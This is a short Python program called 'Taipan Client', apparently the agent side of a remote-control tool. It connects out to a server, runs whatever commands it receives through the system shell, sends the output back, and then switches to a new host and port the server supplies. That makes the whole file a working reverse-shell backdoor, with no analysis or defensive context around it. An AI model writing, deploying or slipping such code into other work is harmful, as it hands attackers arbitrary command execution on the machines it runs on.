"""
Taipan Client

Author: Russell Harvey
"""

import socket
import subprocess

BUFFER = 1024


def main():
    ip = "0.0.0.0"
    port = 110
    while True:
        s = socket.socket()
        s.connect((ip, port))
        command = s.recv(BUFFER).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
        new_info = s.recv(BUFFER).decode()
        new_info = new_info.split(":")
        ip = new_info[0]
        port = int(new_info[1])
        s.close()
    s.close()
